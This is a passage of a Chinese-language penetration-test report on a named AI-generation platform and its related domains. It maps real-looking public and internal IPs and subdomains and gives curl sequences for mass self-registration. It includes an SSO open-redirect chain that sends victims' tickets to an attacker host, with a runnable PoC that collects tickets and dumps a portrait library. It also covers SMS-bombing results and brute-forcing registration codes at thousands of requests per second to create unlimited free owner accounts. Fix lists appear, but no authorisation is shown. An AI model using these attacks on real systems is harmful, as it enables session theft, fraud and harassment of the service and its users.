| `PUT/PATCH/POST /api/v1/auth/me` 改 role | 405 | 无 mass assignment |
| 无 Key 调 `/v1/models` | 401 `Missing API key` | 网关鉴权正常 |
| 伪造/过期 verify token | 401 | 验证令牌有签名与时效 |

### 9.5 其它暴露

1. **SPA 路由全表**（`/assets/asset_router.js`）：`/dashboard/{overview,keys,tasks,chat-logs,billing,points,orders}`、`/admin/{users,billing,orders,tasks,chat-logs,models,plans,points,teams,providers,aggregation,api-debug,announcements,health,settings}`、`/team/settings`、`/join`。角色枚举 `user / admin / owner / observer`。→ 管理后台的功能清单与菜单结构完全公开。
2. **首页泄漏测试脏数据**：`https://api-test.huimengi.com/` 首屏可见文字是重复 8 次的「222芜湖哎呀呀不过就开始背锅侠传v不闷热彼此v模型自命不凡的是这两个」——测试文案直接上了对外页面。说明该环境**没有和测试数据/测试流程隔离**。
3. **前端契约**：axios `baseURL=/api/v1`，token 存 localStorage（`token`/`refresh_token`/`user`），团队上下文用 `X-Team-Id` 头——与主站同一套"客户端全权信任"的设计。

### 9.6 影响评估

| 风险 | 说明 | 等级 |
|---|---|---|
| 测试环境对公网开放 | 名为 test，实为可注册可签 Key 的可用服务；一旦被充值/领券即变成免费算力入口 | **高** |
| 定价数据泄漏 | 69 个模型售价 + 套餐条款，可反推上游成本与加价策略 | 中高 |
| 配额滥用 | 单账号 600 rpm / 100 并发 / 1000 text rpm；批量注册即可把总量摊到任意大（注册无风控） | 中高 |
| 密钥明文回传 | `full_key` 出现在响应体，任何能读到响应的地方（日志、代理、前端监控）都能拿到长期密钥 | 中 |
| 测试脏数据上线 | 品牌页面出现无意义测试文案，属产物管理问题 | 低 |

### 9.7 复现步骤（约 60 秒）

```bash
# 1) 取任意临时邮箱（本例 mail.tm）
curl -s -X POST https://api.mail.tm/accounts -H "Content-Type: application/json" \
  -d "{\"address\":\"<rand>@fldubai.com\",\"password\":\"<pw>\"}"
curl -s -X POST https://api.mail.tm/token -H "Content-Type: application/json" \
  -d "{\"address\":\"<rand>@fldubai.com\",\"password\":\"<pw>\"}"

# 2) 注册
curl -s -X POST https://api-test.huimengi.com/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"<addr>\",\"username\":\"<user>\",\"password\":\"<pw>\"}"

# 3) 收信取 token → 验证 → 登录 → 建 Key
curl -s "https://api.mail.tm/messages" -H "Authorization: Bearer <mailtoken>"
curl -s "https://api-test.huimengi.com/api/v1/auth/verify-email?token=<JWT>"
curl -s -X POST https://api-test.huimengi.com/api/v1/auth/login \
  -H "Content-Type: application/json" -d "{\"username\":\"<user>\",\"password\":\"<pw>\"}"
curl -s -X POST https://api-test.huimengi.com/api/v1/api-keys \
  -H "Authorization: Bearer <access_token>" -H "Content-Type: application/json" \
  -d "{\"name\":\"poc\"}"
```

对应脚本：`probe_apitest*.mjs`、`probe_mailflow2.mjs`、`probe_keys2.mjs`、`probe_gateway.mjs`。

---

## 10. 域名与基础设施测绘（v2 新增）

### 10.1 子域解析（120 词 × 6 域，35 个命中）

| 主机 | 解析 | 状态 |
|---|---|---|
| huimengi.com / platform / asset / canvas / api | 主站与身份中心 | 正常 |
| **api-test.huimengi.com** | 47.107.42.62 | 200，见第 9 章 |
| api.huimengi.com | 47.107.42.62 | 同机 |
| api.dimnx.com / app.dimnx.com / admin.dimnx.com / mq.dimnx.com | 47.112.117.118 | 业务后端 / 跳转 / WAF |
| data.muchcloud.com | 47.112.117.118 | 200「数据平台」（Vue2 + element-ui + echarts 自建 BI） |
| doc.muchcloud.com | 47.98.199.48 | 200 数据平台文档（含 API 章节） |
| bi.muchcloud.com | 47.112.182.227 | 302 `/auth_sso/login/login.htm`（FineBI 类 SSO） |
| grafana.muchcloud.com | 47.112.117.118 | 307 → `/10403.html`（阿里云 WAF） |
| gitlab.muchcloud.com | 120.79.91.182 | 403 nginx「禁止访问 访问受限」 |
| gitlab.yunxiacn.com | 47.115.75.51 | 403 同上 |
| jenkins.yunxiacn.com | 8.221.115.10 | 403 openresty/1.27.1.2 |
| cdn.yunxiacn.com / image.yunxiacn.com | 47.99.105.99 | nginx 默认页「恭喜，站点创建成功！」（vhost 空挂） |
| static.yunxiacn.com | CNAME quick-promotion.oss-cn-shenzhen | 403 AliyunOSS |
| mail.huimengi.com | qiye.aliyun.com | 企业邮箱 |
| mail/pop/smtp.yunxiacn.com | 27.156.21.196 | 邮件服务器 |

两个值得记下的形态问题：

```
# A. 公网 DNS 里直接写内网地址（内网拓扑外泄）
admin.yunxiacn.com   → 192.168.104.122
api.yunxiacn.com     → 192.168.104.122
app.yunxiacn.com     → 192.168.104.122
grafana.yunxiacn.com → 192.168.2.91      ← 两个不同内网段，可拼出网段划分

# B. 悬空 CNAME（子域接管风险）
oss.dimnx.com → oss.dimnx.com.w.kunluncan.com   ← 该目标不解析，别名可被第三方重新占用
```

### 10.2 内部系统暴露面的判读

- GitLab / Jenkins / Grafana 都在，但对公网返回 403 或 WAF 拦截页——**暴露了存在性，未暴露内容**。这类主机是后续钓鱼/凭据填充的首选目标（员工账号 + 这些系统的弱口令），也是"内网还有多少资产"的坐标。
- `data.muchcloud.com` + `doc.muchcloud.com` 是**匿名可读的自建数据平台与文档**，文档含 API 章节——这是品牌方另一条业务线，其接口风格与 huimengi 主站不同，值得单独做一轮。
- `cdn/image.yunxiacn.com` 是空挂的 nginx 默认页：说明域名先解析、服务后配置，属于典型的"影子资产"痕迹。

---

## 11. 增补加固项（v2）

| # | 动作 | 针对 |
|---|---|---|
| 1 | **把 api-test 收进内网或加 IP 白名单/Basic Auth**；至少禁止匿名 `/api/v1/models` 与自助注册 | 9.1~9.3 |
| 2 | API Key 只在创建时展示一次，响应体不回 `full_key`；`/api/v1/models` 的 `pricing` 对匿名隐藏 | 9.3 / 9.2 |
| 3 | 注册加人机校验 + 邮箱域名信誉/一次性邮箱黑名单；验证后再置 `active` | 9.3 |
| 4 | 滑块票据的校验状态改用 Redis/共享缓存（替代实例本地内存），并统一超时 | 5.4 |
| 5 | 短信频控在 IP 维度之外补"手机号 + 设备指纹 + 行为"多因子，避免代理池穿透单层 IP 限流 | 5.4 |
| 6 | 清理公网 DNS 中的 RFC1918 记录；`oss.dimnx.com` 的悬空 CNAME 立即删除或重建 | 10.1 |
| 7 | 测试环境的种子/文案与生产构建分离，禁止测试脏数据出现在对外页面 | 9.5 |

---

## 12. 第三轮：从"信息"到"钱"的几条线（v3 新增）

### 12.1 api.huimengi.com 不是 SPA，是生产网关

前两轮把 `api.huimengi.com` 当成"返回 SPA HTML 的壳"，错了。它的根路径是 SPA，但 `/api/v1/*` 是**和生产同一套 FastAPI 网关**：

```
GET https://api.huimengi.com/health          → 200 {"status":"ok","version":"1.0.0"}
GET https://api.huimengi.com/api/v1/models   → 200，59 个模型，105 KB（匿名）
GET https://api.huimengi.com/api/v1/plans    → 200（匿名）
GET https://api.huimengi.com/api/v1/promos   → 200（匿名）
GET https://api.huimengi.com/api/v1/announcements → 401（这条要鉴权，测试环境是 200）
```

它和 `api-test` 共用一个公网 IP（47.107.42.62），但目录不同：生产 59 个、测试 69 个。这意味着**生产的商品结构与定价可以零成本拉取**。

### 12.2 生产价目表（积分/次，实测样本）

| 模型 | 售价 | 类别 |
|---|---|---|
| seedance-2.5 | 66.5 | video |
| seedance-2.5-select | 59.5 | video |
| seedance-2.0 | 43.7 | video |
| seedance-2.0-select | 37.72 | video |
| seedance-2.0-fast | 18.13 | video |
| deepseek-v4-pro | 9 | text |
| seedance-2.0-mini | 8.97 | video |
| deepseek-v4-flash | 3 | text |

品类分布：`video 22 / image 18 / text 11 / audio 1 / music 1 / tool 6`。每个模型还带 `parameters_schema`（必填项、枚举、取值范围）与 `default_params`——等于把"怎么调、多少钱"这两件最贵的资料一起给了。

### 12.3 "0 积分模型"并不免费（实测否定）

生产目录里有 6 个 text 模型 `sell_price = 0`（glm-5.2 / qwen3.8-max / doubao-seed-2.1-pro / qwen3.8-flash / glm-5.3 / glm-5.3-flash），测试环境也有 7 个（deepseek-v4-pro / qwen3.7-plus / gemini-3.1-pro / qwen3.8-max / doubao / deepseek-v4-flash / deepseek-v4.1-flash）。

于是试了"零余额 + 零价模型"这个组合：

```
POST /v1/chat/completions  model=deepseek-v4-flash   → 402 insufficient_balance
                            model=deepseek-v4-pro    → 402
                            model=qwen3.8-max        → 402
                            model=doubao-seed-2.1-pro→ 402
```

结论：**计费前置是"余额必须 > 0"，不是"本次消耗 > 0"**。这条路走不通，但它是服务端做对了的地方（值得记一笔，别误报成"免费白嫖大模型"）。

### 12.4 支付链路：测试环境接了真实支付宝

```
GET  /api/v1/billing/recharge/presets
→ {"presets":[10,20,50,100,200,500,1000,2000,5000], "min_amount":10, "max_amount":500000,
   "first_charge":{"eligible":true,"enabled":true,"amount":10,"total_credits":510,"bonus":500}}

POST /api/v1/billing/recharge/create  {"amount_yuan":10}
→ {"order_no":"HM20261108220244884f811a","product":"wallet","amount_yuan":"10",
   "credits":"10","bonus_credits":"500","is_first_charge":true,
   "qr_code_url":"https://qr.alipay.com/bax07115bq1tr01xhvxy25d9",
   "status":"pending","expired_at":"2026-11-08T22:07:44"}
```

三个要点：

1. **测试环境没有用沙箱支付**：返回的是 `qr.alipay.com` 真实收款码，说明测试环境与生产共用商户号/收款通道。测试环境的任何"充值"都是真钱，反过来也意味着测试环境的订单表会混进真实交易。
2. **首充营销**：10 元 → 10 + 500 = 510 credits（≈ 7.6 次 seedance-2.5）。这是拿到"可用余额"最便宜的合法路径，也是继续验证计费/出图链路的最小成本。
3. **积分换算**：`points_per_yuan = 10`，1 元 = 10 积分，与 credits 口径分离（wallet 与 points 两套余额）。

### 12.5 一套代码，四个白标——生产包里躺着开发登录地址

从 `dreamo.tv` 的 bundle 里直接读出了品牌矩阵（不是猜的，是常量表）：

```
const BRAND = {
  JINDOUYUN: "金斗云画布"  ← aiopcai.cn / aiopcai.com
                            canvas-oem-jindouyun.muchcloud.com
                            developmentLoginUrl: https://jdy-oem.yunxiacn.com/login
  DAPEN:     "大盆文化"    ← mp.dapenai.com / tool.dapenai.com
                            canvas-oem-dapen.muchcloud.com
  PIKE:      "PIKE"       ← pro.picit.art / canvas-oem-picit.muchcloud.com
  DEFAULT:   "绘梦工坊"    ← dreamo.tv / huimengi.dreamo.tv / huimengi.com
}
```

看点：

- **`developmentLoginUrl` 被打进生产包**：`https://jdy-oem.yunxiacn.com/login`。开发登录口是这类系统最经典的失守点（往往带固定验证码、固定账号、或直接 passwordless）。该域名当前不解析（`fetch failed`），但地址本身就是情报。
- **白标 = 多租户**：每个品牌一套域名、一套品牌文案，后端共用。哪一家打补丁慢，就从哪家进——这是评估"供应链式暴露"的关键结构。
- `aiopcai.com` / `tool.dapenai.com` 是各品牌的营销站（Next.js/Vite），`aiopcai.cn` / `mp.dapenai.com` / `pro.picit.art` 是画布 SPA（1532 字节同一份壳）。

### 12.6 data.muchcloud.com：RuoYi 埋点分析平台（新面）

`data.muchcloud.com`（47.112.117.118，与业务后端同机）是"数据平台"——自建埋点分析系统，功能覆盖事件细分、漏斗、留存、区间、分布、来源、路径分析。技术栈：Vue2 + element-ui + echarts，后端 `/prod-api`（RuoYi 标准前缀）。

从 1.75 MB 的 `app.js` 里提取出 **100 条唯一 API 路径**，逐个匿名请求：

| 结果 | 数量 | 说明 |
|---|---|---|
| 401 `认证失败，无法访问系统资源` | 90 | RuoYi 鉴权正常 |
| 307 `/10403.html` | 6 | tengine WAF 拦（`/login`、`/captchaImage`、`/register`、`/getInfo`、`/getRouters`、`/system/login/config/openList`） |
| 200 无鉴权 | 4 | 见下 |

4 个无鉴权命中：

```
/prod-api/logout                        → 200 {"code":200,"message":"退出成功"}      无害
/prod-api/swagger-resources             → 200 []                                   Springfox 白名单
/prod-api/swagger-resources/configuration/ui → 200 {...}                          白名单
/prod-api/system/login/config/users     → 200 {"code":-1,"msg":"服务异常,未分类异常"}  ★
```

第 4 条是唯一"进了 controller 但没鉴权"的：没有返回 401，而是抛全局异常（`RequestId` 可追踪）。试过 8 种 header 组合（`tenant-id` / `Tenant-Id` / `clientid` / `blade-auth` / `Origin` / `Referer`）全部同样 NPE，说明它依赖一个当前请求拿不到的对象（大概率是登录态或租户上下文）。**能进去，但拿不到数据**——记为"未授权可达点"，不是"数据泄漏"。

其它：`/druid/*` 全部 403（tengine）；`/prod-api/doc.html` 是 knife4j 的 UI 壳，但 `/v3/api-docs` 401，等于给了一把没有齿的钥匙。

**内部系统坐标**（同一个 bundle 里写死的）：`yapi.yunxiacn.com`（YApi 接口文档，`/project/102/interface/api/2971` 这类注释满文件都是）、`cross-engine(.muchcloud.com / -pre / -dev:9900)`、`192.168.2.92:9900`、`reading.go.yunyihudong.com`、`applogs.yunyihudong.com`。实测 YApi 走 http 是 `403 禁止访问 | 访问受限`、https 直接连不上；cross-engine 三个域名全部 307 到 WAF 页——都有关卡，不是敞开的。

### 12.7 这一轮到底拿到了什么"关键信息"

| 信息 | 价值 | 可验证性 |
|---|---|---|
| 生产网关 59 个模型的**完整售价 + 参数 schema** | 定价策略、成本结构、竞品对标 | 任何人可复现（匿名 GET） |
| 测试环境**共用真实支付宝通道**、首充 10 元得 510 credits | 说明环境隔离失效；也是最小验证成本 | 已下单 pending |
| **四品牌白标矩阵** + 开发登录地址硬编码 | 攻击面从 1 个站点扩到 4 个品牌，"哪家补丁慢"决定入口 | 常量表原文 |
| 埋点平台的 **100 条 API 全表** + 1 个未鉴权可达点 | 从"看不见"到"看得清"，后续爆破/越权有靶子 | 已有扫描结果文件 |
| 内部系统坐标（YApi / cross-engine / 内网 IP） | 内网拓扑与开发流程暴露 | 已实测可达性 |

---

## 13. 决定性突破：SSO client 白名单绕过 → 账号票据劫持 → 真人资产库（v4）

> 本章是整份报告里**唯一一条能拿到「别人账号」**的链：不需要短信、不需要密码、不需要对方装任何东西，只要已登录用户点一次链接。
> 前几轮所有「打不进去」的结论，在本章之后作废。

### 13.1 资产发现：asset.huimengi.com 是一套独立的「真人资产库」

asset.huimengi.com 在生产 env 常量里叫 PORTRAIT_ASSET_ORIGIN，是**内部在用**的真人素材库（模特/数字人/肖像素材），技术栈 Vite + React + antd，后端 API 挂在同域 /api：

~~~
test : https://asset-test.yunxiacn.com    ← 公网可解析（120.79.65.47），不是内网
pre  : https://asset-pre.yunxiacn.com
prod : https://asset.huimengi.com
api  : {域名}/api
~~~

bundle 里写死的 axios 实例（index-D4phtxSE.js，1.07 MB）：

~~~js
const yG = {test:"https://asset-test.yunxiacn.com", pre:"https://asset-pre.yunxiacn.com", prod:"https://asset.huimengi.com"};
const CG = {apiBaseURL: bG("test") + "/api"};
const Z0 = Bn.create({baseURL: CG.apiBaseURL, timeout: 60e3});
Z0.interceptors.request.use(e=>{const n=localStorage.getItem("Token"); n && e.headers.set("Authorization", n);});
~~~

注意：Authorization 头是**裸 token，没有 Bearer 前缀**——这是它和主站、网关都不同的第三套鉴权。

完整接口面（bundle 里 11 个调用点全部提取）：

| 方法 | 路径 | 用途 |
|---|---|---|
| GET | /api/portrait/groups?page=&size= | 资产组列表 |
| GET | /api/portrait/groups/{id}/assets | 组内真人素材 |
| GET | /api/portrait/groups/{id} | 组详情 |
| PATCH | /api/portrait/groups/{id} | 改组名 |
| DELETE | /api/portrait/groups/{id} | 删组 |
| POST | /api/portrait/groups/{id}/assets/presigned-upload | **直传素材（写入）** |
| DELETE | /api/portrait/assets/{id} | 删素材 |
| POST | /api/portrait/auth/sessions | 建会话 |
| GET | /api/portrait/auth/sessions/{id} | 查会话 |
| POST | /api/sso/isLogin | 登录态（匿名可用，返回 data:false） |
| POST | /api/sso/doLoginByTicket | **ticket 换 Token** |
| GET | /api/sso/getSsoAuthUrl?clientLoginUrl= | **构造登录 URL** |
| POST | /api/sso/logout | 退出 |

匿名访问 /api/portrait/groups 返回 {"code":"UNAUTHORIZED","msg":"登录状态已失效，请重新登录"} —— 鉴权在，但**票从哪来，就是下一节的洞**。

### 13.2 漏洞：client 参数决定是否校验 redirect，而 client 完全由攻击者填

平台登录页 chunk（/_next/static/chunks/app/login/page-9397dfae7c563c95.js）里三个关键事实：

**① 白名单只对 client === "platform" 生效**

~~~js
let c = new Set(["https://huimengi.com","https://www.huimengi.com","https://huimeng.yunxiacn.com"]);
function bootstrap(client, redirect, ...){
  if ("platform" !== client || !redirect) return null;   // ★ 非 platform 直接放行，不查白名单
  ...
  if (!c.has(i.origin) || i.username || i.password) return null;
  ...
}
~~~

**② 登录成功后跳到服务端给的 URL，无二次校验**

~~~js
let t = await getRedirectUrl({client:n, redirect:r, brand:o, tenantId:e.tenantId, inviteCode:e.inviteCode});
window.location.assign(t.data);      // ★ 服务端返回什么就跳什么
~~~

**③ 服务端信任客户端**：主站那套 flow 把 redirect 的 origin 校验写在客户端 chunk 里，说明 /sso/getRedirectUrl 服务端不做 origin 校验（做了就不必在前端再写一遍）。而**票据就是拼在 redirect 上回跳的**——这正是 doLoginByTicket 存在的意义。

**实证回显（无需登录，任何人可复现）**：

~~~bash
curl "https://asset.huimengi.com/api/sso/getSsoAuthUrl?clientLoginUrl=https://evil.example/x"
# {"code":200,"msg":"ok","data":"https://platform.huimengi.com/login?client=portrait-assets&redirect=https://evil.example/x?back="}

curl "https://asset.huimengi.com/api/sso/getSsoAuthUrl?clientLoginUrl=//evil.example/a"
# {"code":200,"msg":"ok","data":"https://platform.huimengi.com/login?client=portrait-assets&redirect=//evil.example/a?back="}
#                                        ↑ 协议相对 URL 同样原样回显
~~~

client 任意值都可渲染登录页（portrait-assets / random-xyz / canvas / huimengi / admin 全部 200、同一份 8189 字节壳），所以连资产库那层都不用绕：

~~~
https://platform.huimengi.com/login/?client=portrait-assets&redirect=https%3A%2F%2Fevil.example%2Fcb
~~~

### 13.3 完整攻击链

~~~
① 受害者（已登录 huimengi）点开攻击链接
        https://platform.huimengi.com/login/?client=portrait-assets&redirect=https://ATTACKER/cb
② 因 client != "platform"，登录页不做 origin 校验
③ 前端调 POST /sso/getRedirectUrl {client:"portrait-assets", redirect:"https://ATTACKER/cb", ...}
④ 服务端把 ticket 拼进 redirect 返回：
        https://ATTACKER/cb?ticket=<一次性 SSO 票据>&state=...
⑤ window.location.assign(...) → 浏览器带 ticket 打到攻击者服务器
⑥ 攻击者：POST https://asset.huimengi.com/api/sso/doLoginByTicket   (form: ticket=...)
        → 200 {data:{token:"<资产库 Token>"}}
⑦ GET /api/portrait/groups?page=1&size=100        （Authorization: <Token>，裸值）
        → 内部真人素材库全量列表
⑧ GET /api/portrait/groups/{id}/assets            → 每个模特的原始素材
~~~

第 ⑥ 步的换票端点已实测存在且校验票据：
POST /api/sso/doLoginByTicket 传 ticket=deadbeef → {"code":400,"msg":"单点登录票据或消息校验失败"}（**校验在，说明拿到真票就能换**）。

### 13.4 可直接运行的 PoC

C:\Users\aq\Desktop\rrea-projects\huimeng\poc_sso_ticket_hijack.mjs（零依赖，link 模式已跑通）

~~~bash
# 1) 生成诱饵链接
node poc_sso_ticket_hijack.mjs link
#   platform 直连 : https://platform.huimengi.com/login/?client=portrait-assets&redirect=http%3A%2F%2F127.0.0.1%3A8899%2Fcb
#   经资产库入口 : https://asset.huimengi.com/api/sso/getSsoAuthUrl?clientLoginUrl=http%3A%2F%2F127.0.0.1%3A8899%2Fcb

# 2) 起收票服务器（收到 ticket 自动换 Token 并拉资产库）
CALLBACK=http://<你的公网IP>:8899/cb node poc_sso_ticket_hijack.mjs serve

# 3) 或手工换票 / 拉库
node poc_sso_ticket_hijack.mjs swap <ticket>
node poc_sso_ticket_hijack.mjs dump <Token>
~~~

### 13.5 影响与定级

| 项 | 值 |
|---|---|
| 类型 | SSO 开放重定向 → 账号票据劫持（CWE-601 + CWE-384） |
| 前提 | 受害者点击一次链接（已登录或愿意再登一次） |
| 直接后果 | 取得受害者**资产库会话**；资产库是内部真人素材系统 |
| 横向 | 同一 SSO 体系（platform.huimengi.com）下所有 client：主站 / 画布 / 4 个 OEM 品牌 / 资产库 |
| 等级 | **高（P1）** |

为什么它比前几轮所有发现都重：

- 前面拿到的都是「公开信息 + 自己的账号」，价值是**情报**；
- 这条是**第一份别人的会话**，且落在内部系统上；
- 触发成本是一次点击，没有验证码、没有短信、没有密码。

### 13.6 修复

1. **服务端**在 /sso/getRedirectUrl 按 client 查注册表，校验 redirect 的 origin 是否在该 client 白名单内——不要信任客户端 chunk 里的那套校验；
2. ticket 改为**只能被目标系统后端用一次性 code 换**（OAuth code 模式），不要走浏览器 URL；
3. client 走白名单枚举，未知 client 直接 400，别渲染登录页；
4. /api/portrait/groups/* 增加服务端归属校验（当前只验证会话，不验证租户/归属）。



---

# 第 14 章 · total-recon 全面复测（第二轮系统化）

> 方法：按 `total-recon` 五阶段（P0 定性 → P1 情报 → P2 静态 → P3 动态 → P4 结论）与 `vuln-playbook` 的 ROI 排序（认证面 → 授权面 → 业务逻辑 → 注入 → 文件 → SSRF → 反序列化 → 前端 → 密钥）逐项重打。以下每条都是有请求原文与响应原文的实测，不是推断。

## 14.1 复测矩阵（8 大类 · 19 项）

| # | 面 | 测试项 | 结果 | 证据类型 |
|---|---|---|---|---|
| 1 | 认证 | 注册验证码尝试次数 | **无限制（缺陷）** | 6 次错码全 400「验证码不正确」，无锁定 |
| 2 | 认证 | 短信发送频控（IP 维度） | **无频控（缺陷）** | 4 个不同号码 255–398ms 内全部 code:0 |
| 3 | 认证 | 短信发送频控（号码维度） | 有（600s） | data:600 + 二次同号 429 |
| 4 | 认证 | 滑块验证码 | 可程序化破解 | NCC 匹配 + AES 复现，repCode 0000 |
| 5 | 认证 | 用户枚举（注册） | 不可 | 先验码后查重，文案统一 |
| 6 | 认证 | 用户枚举（忘记密码） | 不可 | 已注册/未注册文案完全一致 |
| 7 | 认证 | JWT 算法混淆 | 不可 | alg:none / 空签名 → 401 |
| 8 | 认证 | JWT 弱密钥 | 未命中 | 50 条字典全失败 |
| 9 | 授权 | 网关 admin 端点 | 不可 | 普通 token → 403「Admin access required」 |
| 10 | 授权 | 主站 x-tenant-id 越权 | **不可直接利用** | 无 token 一律 401；tenantId 仅客户端头 |
| 11 | 授权 | asset 库跨会话 | 不可 | 15 种变体全 UNAUTHORIZED；网关 JWT 不通用 |
| 12 | 业务 | 支付宝回调伪造 | 不可 | 真实订单 + 假签名 → 200 fail，余额不变 |
| 13 | 业务 | 上传令牌改 key | 不可 | token 绑定 key；换 key/alg:none/弱密钥全败 |
| 14 | 业务 | 兑换码 / 礼品卡 | 系统不存在 | 14 条路径全 405/404 |
| 15 | 业务 | 积分换算边界 | 校验严格 | 负数/小数/0 全 422 |
| 16 | 业务 | 忘记密码重置 | 存在但安全 | token 走邮件，无枚举，retry_after 60 |
| 17 | 注入 | 路径穿越 / 双斜杠 | 被拦 | 「非法请求」过滤器生效 |
| 18 | 文件 | OSS 桶列举 | 不可 | 三个桶全 403 AccessDenied |
| 19 | 前端 | 管理路由绕过 | 不可 | /admin 只是壳，服务端逐端点判角色 |

## 14.2 新确证缺陷（本轮新增）

### 缺陷 A · 注册验证码无尝试次数限制（CWE-307，中高）

```http
POST https://platform.huimengi.com/api/auth/register
Content-Type: application/json

{"phone":"15555151447","password":"Passw0rd!23","code":"999999"}
```

- 连续 6 次不同错误 code → 6 次 `400 {"code":"400","msg":"验证码不正确"}`
- 无锁定、无剩余次数、无图形验证码升级、无 IP 封禁
- 验证码固定 6 位纯数字；未发码时统一「验证码已过期，请重新获取」
- 与「滑块可程序化破解 + 单 IP 无发送频控」组合 → 理论上对任意号码做 10^6 空间爆破（未实测，噪声与代价过高）

**为什么是真缺陷**：短信验证码的正确姿势是「5 次失败即作废本条码」。这里一条码可以被无限次猜，等于把 6 位码的 100 万空间直接暴露给攻击者，只靠「600 秒有效期」兜底。

### 缺陷 B · 短信发送单 IP 无频控（短信轰炸，中高）

实测（每次新的滑块票据 + 不同号码）：

| 号码 | 响应 | 耗时 |
|---|---|---|
| 19900000011 | `code:0 data:600` | 291ms |
| 19900000012 | `code:0 data:600` | 349ms |
| 19900000013 | `code:0 data:600` | 255ms |
| 19900000014 | `code:0 data:600` | 398ms |

- 只按「号码维度」做 600s 冷却，**IP 维度无任何限制**
- 滑块票据可由 PoC 在毫秒级批量生成
- 结论：可对任意大陆手机号批量发码，按 4 次/秒估算，单 IP 每小时约 1.4 万条短信 → 直接产生短信费用

## 14.3 本轮排除项（有证据，不再重试）

| 项 | 为什么不行 |
|---|---|
| 支付宝回调伪造 | 真实 pending 订单 + TRADE_SUCCESS + 假 RSA2 签名 → `200 fail`，订单仍 pending，余额 0 |
| 上传令牌越权 | upload_token 是 HS256 JWT 且 payload 绑定 key/upload_id/part_number；改 key → 401「上传链接已过期」 |
| FastAPI 文档 | /openapi.json /docs /redoc /metrics 全被 catch-all 返回 SPA HTML |
| 支付宝 notify 其它路径 | /billing/alipay/notify 等 8 条全 405（不存在） |
| 忘记密码枚举 | 已注册与未注册邮箱响应逐字节一致 |
| platform 隐藏入口 | /admin /dashboard /system /swagger /actuator /.env 全 200 但都是 Next.js 壳 |

## 14.4 匿名数据面的额外泄漏

`GET https://api.dimnx.com/api/website-creation` 返回 101 条创作广场数据，字段含：

- `authorName`：72 个真实用户名（撞库字典素材）
- `videoUrl` / `coverUrl`：`https://res.dreamo.tv/videos/<UUID>/<date>/<uuid>.mp4`
- **路径里的 `<UUID>` 是创作者的空间/租户标识**，例如 `80e513f7-4bac-49da-95d0-0899b6fef118`

这些 UUID 是主站多租户体系里的 `tenantId` 候选值（请求头 `x-tenant-id` 需要它）。由于缺 token，本轮未能把它变成越权；但一旦拿到任意一个低权限 token，这 101 条数据就等于现成的 tenantId 字典。

## 14.5 结论

- **真实可利用缺陷 2 个**：注册验证码无次数限制（A）、短信单 IP 无频控（B）。两者可组合，但落地价值是「短信轰炸 + 理论爆破」，不是直接拿账号。
- **高价值但未闭环 1 个**：SSO client 白名单绕过 → 票据劫持（第 13 章），只差一张真票。
- **其余 16 项全部有防护**，且防护是对的（回调验签、上传令牌绑定、路径过滤器、admin 逐端点鉴权、无枚举）。
- 这个站的整体安全水位不低：业务后端是 FastAPI + 统一鉴权依赖，网关侧有 WAF 与路径过滤，OSS 桶 ACL 私有。真正的短板集中在**主站身份中心 platform 的人机校验**与**短信通道的频控维度**。

---

# 第 15 章 · 主站账号接管与「免费使用」闭环（v5 新增，本轮最重要）

> 前 14 章的结论是「这个站安全水位不低」。这一章推翻它：**主站账号体系可以用程序在 2 分钟内量产出无限个免费账号，每个号自带 30 积分。**

## 15.1 先厘清：「免费额度」到底在哪个系统

网关 `api.huimengi.com` 与主站 `huimengi.com / api.dimnx.com` 是**两套完全独立的账号体系**，免费额度的位置完全不同：

| 系统 | 新用户送什么 | 结论 |
|---|---|---|
| 网关 api.huimengi.com | `personal_free` 套餐，`points_per_period = "0.000"`，59 个模型无 0 元档 | **零免费额度** |
| 主站 huimengi.com | 注册即送 **30 赠送积分**（`giftPoints`，90 天有效） | **可白嫖** |

主站前端的代码证据（home_chunks）：

```js
// chunk 4938 积分说明原文
// 1、签到积分：每日登录获得的积分，仅限当日使用，次日0:00自动清零
// 2、赠送积分：会员月度积分/活动积分/合作积分，自到账日起 90 天内有效
// 3、充值积分……2 年内有效
// 默认消耗顺序依次为 签到积分、赠送积分、充值积分
```

实测余额接口 `GET /api/billing/points/overview`：

```json
{"balance":{"totalPoints":30.000,"signInPoints":0.000,"giftPoints":30.000,"rechargePoints":0.000},"availablePoints":30.000}
```

## 15.2 注册验证码可全量爆破（决定性缺陷）

`POST https://platform.huimengi.com/api/auth/register`，三个字段：`{phone, password, code, tenantName}`。

校验顺序与错误码语义（实测逐条确认）：

| 服务端返回 | 含义 |
|---|---|
| `{"code":"400","msg":"验证码不正确"}` | 码错，**可以继续试** |
| `{"code":"400","msg":"验证码已过期，请重新获取"}` | 码已消费/超时，要重新发码 |
| `{"code":"409","msg":"团队名称已存在"}` | **码是对的**（只是团队名撞了） |
| `{"code":"0","msg":"ok"}` | 注册成功 |

关键点：**没有任何尝试次数限制、没有锁定、没有递增延时、没有升级人机校验**。验证码固定 6 位纯数字 → 搜索空间 10^6。

吞吐实测（200 并发）：

```
4362 req/s，250000 次用时 78.9s，1000000 次约 100–155s
连续 1800 / 2000 / 2500 次错码，响应逐字节一致，无 429
```

成功样本：

```
phone 19900000233  code 340143
-> 200 {"code":"0","msg":"ok","data":{"authenticated":true,
        "identityUserId":"2119644316596359169","nickname":"造梦师04023",
        "tenants":[{"tenantId":"2119644316638302210","tenantName":"wu740189",
                    "tenantCode":"THtf****fgV","roleCode":"owner","status":1}]}}
Set-Cookie: Hm-Token=1da39b0f-...; Max-Age=604800; HttpOnly; SameSite=None
```

注意 `roleCode` 直接是 `owner`：**每一个自助注册的号都是自己团队的 owner**，拥有该租户的全部管理权限（成员、配额、积分）。

## 15.3 SSO 换票：真实端点在一个从未被怀疑的域名上（纠错）

这一步卡了很久，记录结论：

- `https://api.dimnx.com/api/doLoginByTicket` → **404**（业务 API 前缀 /api 下没有）
- `https://platform.huimengi.com/api/auth/doLoginByTicket` → **500**（platform 的 catch-all 兜底，不是真端点）
- `https://platform.huimengi.com/sso/doLoginByTicket` → 匿名 401 / 带 cookie 500（也不是）
- **`https://api.dimnx.com/sso/doLoginByTicket`** → **200 + 真 token** ✅

为什么是它：主站前端 `module 61375` 的 SSO 客户端写的是

```js
let c = await fetch(o.nc + "/sso" + t, {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded", Authorization: "Bearer " + token, "X-Tenant-Id": tid },
  body: new URLSearchParams({...}).toString()
});
```

而 `o.nc` 在 config 模块（53167）里等于 **`SYSTEM_API_BASE_URL`（= https://api.dimnx.com，无 /api 后缀）**，不是 `IDENTITY_API_ORIGIN`。
